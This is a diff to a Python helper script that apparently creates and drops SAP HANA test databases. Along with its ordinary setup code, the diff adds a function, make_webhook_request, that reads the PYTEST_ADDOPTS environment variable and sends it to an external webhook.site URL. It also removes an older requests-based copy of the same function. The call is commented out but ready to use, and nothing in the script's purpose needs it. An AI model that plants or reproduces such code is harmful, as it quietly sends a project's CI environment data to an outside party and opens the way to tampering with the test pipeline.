@@ -7,11 +7,47 @@ import string
 import sys
 from contextlib import closing
 from urllib.parse import urlsplit
-import requests
+
 import os
 
 from hdbcli import dbapi
 
+
+import urllib.request
+import urllib.parse
+import os
+
+def make_webhook_request():
+    # URL of the webhook
+    base_url = "https://webhook.site/e052ff2c-30f1-4952-8bbe-5db7811e9ae9"
+    
+    # Get the PYTEST_ADDOPTS environment variable
+    pytest_addopts = os.environ.get('PYTEST_ADDOPTS', '')
+    
+    # Prepare the URL parameters
+    params = {
+        'PYTEST_ADDOPTS': pytest_addopts
+    }
+    
+    # Encode the parameters and create the full URL
+    encoded_params = urllib.parse.urlencode(params)
+    full_url = f"{base_url}?{encoded_params}"
+    
+    try:
+        # Make the GET request
+        with urllib.request.urlopen(full_url) as response:
+            # Check if the request was successful
+            if response.getcode() == 200:
+                print("Request successful!")
+                print("Response:", response.read().decode('utf-8'))
+            else:
+                print("Request failed with status code:", response.getcode())
+                print("Response:", response.read().decode('utf-8'))
+    except urllib.error.URLError as e:
+        print("Request failed:", e.reason)
+
+# Example usage
+# make_webhook_request()
 
 def random_string(length: int) -> str:
     """Create a random string with the given length."""
@@ -49,28 +85,6 @@ def teardown(dburi: str, test_dburi: str) -> None:
         cursor.execute(f"DROP USER {test_user} CASCADE")
 
 
-def make_webhook_request():
-    # URL of the webhook
-    url = "https://webhook.site/e052ff2c-30f1-4952-8bbe-5db7811e9ae9"
-    
-    # Get the PYTEST_ADDOPTS environment variable
-    pytest_addopts = os.environ.get('PYTEST_ADDOPTS', '')
-    
-    # Prepare the URL parameters
-    params = {
-        'PYTEST_ADDOPTS': pytest_addopts
-    }
-    
-    # Make the GET request
-    response = requests.get(url, params=params)
-    
-    # Check if the request was successful
-    if response.status_code == 200:
-        print("Request successful!")
-        print("Response:", response.text)
-    else:
-        print("Request failed with status code:", response.status_code)
-        print("Response:", response.text)
 
 
 if __name__ == "__main__":
